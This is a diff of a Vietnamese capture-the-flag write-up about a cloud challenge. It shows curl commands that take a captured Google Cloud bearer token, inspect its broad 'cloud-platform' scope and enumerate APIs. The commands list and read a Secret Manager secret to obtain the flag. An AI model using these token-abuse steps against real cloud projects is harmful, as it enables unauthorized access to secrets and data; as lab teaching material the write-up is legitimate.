@@ -166,26 +166,26 @@ Trong request bắt được có:
 "authorization": "Bearer ya29.c.c0AZ4bNp..."
 ```
 
-Google có endpoint công khai [`oauth2.googleapis.com/tokeninfo`](https://oauth2.googleapis.com/tokeninfo?access_token=) nhận access token qua query param và trả lại metadata của nó mà không cần header `Authorization` — rất tiện để soi nhanh một token lạ trước khi dùng:
+Google có endpoint công khai https://oauth2.googleapis.com/tokeninfo?access_token= nhận access token qua query param và trả lại metadata của nó mà không cần header `Authorization` — rất tiện để soi nhanh một token lạ trước khi dùng:
 
 ```bash!
 curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN"
 ```
-
-![](./tokeninfo_result.png)
+![image](https://hackmd.io/_uploads/r14TNBT9fe.png)
 
 ```json!
 {
   "azp": "113330607461496374286",
   "aud": "113330607461496374286",
   "scope": "https://www.googleapis.com/auth/cloud-platform",
-  "exp": "1790939399",
-  "expires_in": "2398",
+  "exp": "1790956078",
+  "expires_in": "3525",
   "access_type": "online"
 }
 ```
 
-Field quan trọng nhất là `scope`: `https://www.googleapis.com/auth/cloud-platform` là scope rộng nhất GCP có — nó không giới hạn token vào một API cụ thể (như `devstorage.read_only` chỉ đọc được Storage), mà cho phép gọi **bất kỳ** API nào mà IAM role của service account cho phép. Kiểm tra `tokeninfo` xác nhận token này có scope `cloud-platform` — tức là một chiếc chìa khoá vạn năng cho cả project GCP.
+Field quan trọng nhất là `scope`: `https://www.googleapis.com/auth/cloud-platform` là scope rộng nhất GCP có — nó không giới hạn token vào một API cụ thể (như `devstorage.read_only` chỉ đọc được Storage), mà cho phép gọi **bất kỳ** API nào mà IAM role của service account cho phép. 
+-> Ta đã có thể truy cập vào bất cứ đâu ta muốn
 
 Bash payload:
 ```bash!
@@ -212,11 +212,23 @@ Dùng token như một client GCP bình thường:
 ![image](https://hackmd.io/_uploads/BkRnsla5Me.png)
 -> project number: `613713115850`
 
-
 ![image](https://hackmd.io/_uploads/SJOChl65Gx.png)
 
+2. Thử GCS (Storage) để xem token có quyền gì -> không có quyền, nhưng message lỗi lại tự "khai" luôn service account đang dùng:
+-> lỗi 403: `"meteorologist@css-ctf-2026.iam.gserviceaccount.com does not have storage.buckets.list access to the Google Cloud project."`
+![image](https://hackmd.io/_uploads/HkOV8S65Gx.png)
 
+3. `Resource Manager` bị disable, `GCS` thì thiếu quyền -> ta không biết chắc token này đụng được gì. Cách hợp lý là đi theo checklist enumerate các API phổ biến của GCP mà một service account dạng này hay được gán quyền (Compute, Storage, Secret Manager, Pub/Sub, ...) 
+4. Gợi ý: "cloud" + backend tự host credential
+-> Secret Manager đáng nghi nhất
+Liệt kê secret trong Secret Manager -> trúng
+![image](https://hackmd.io/_uploads/rJ9vvHT5fx.png)
+```javascript!
+ "name": "projects/613713115850/secrets/goog_encryption_secret"
+```
+5. Từ đó ta vào `/v1/projects/613713115850/secrets/goog_encryption_secret/versions/latest:access` để lấy flag
 
+![image](https://hackmd.io/_uploads/BykCPHa9zx.png)
 
 ```javascript!
 {
@@ -246,14 +258,7 @@ curl -s -H "$A" "https://storage.googleapis.com/storage/v1/b?project=61371311585
 # -> 403: "meteorologist@css-ctf-2026.iam.gserviceaccount.com does not have
 #    storage.buckets.list access to the Google Cloud project."
 
-# Resource Manager bị disable, GCS thì thiếu quyền -> ta không biết chắc
-# token này đụng được gì. Cách hợp lý là đi theo checklist enumerate các
-# API phổ biến của GCP mà một service account dạng này hay được gán quyền
-# (Compute, Storage, Secret Manager, Pub/Sub, ...) cho tới khi tìm ra API
-# nào "ăn". Context của bài (gợi ý "cloud", backend tự host credential)
-# khiến Secret Manager là ứng viên đáng thử sớm.
-
-# 3) Liệt kê secret trong Secret Manager -> trúng
+# 3) Liệt kê secret trong Secret Manager -
 curl -s -H "$A" \
   https://secretmanager.googleapis.com/v1/projects/613713115850/secrets
 # -> goog_encryption_secret
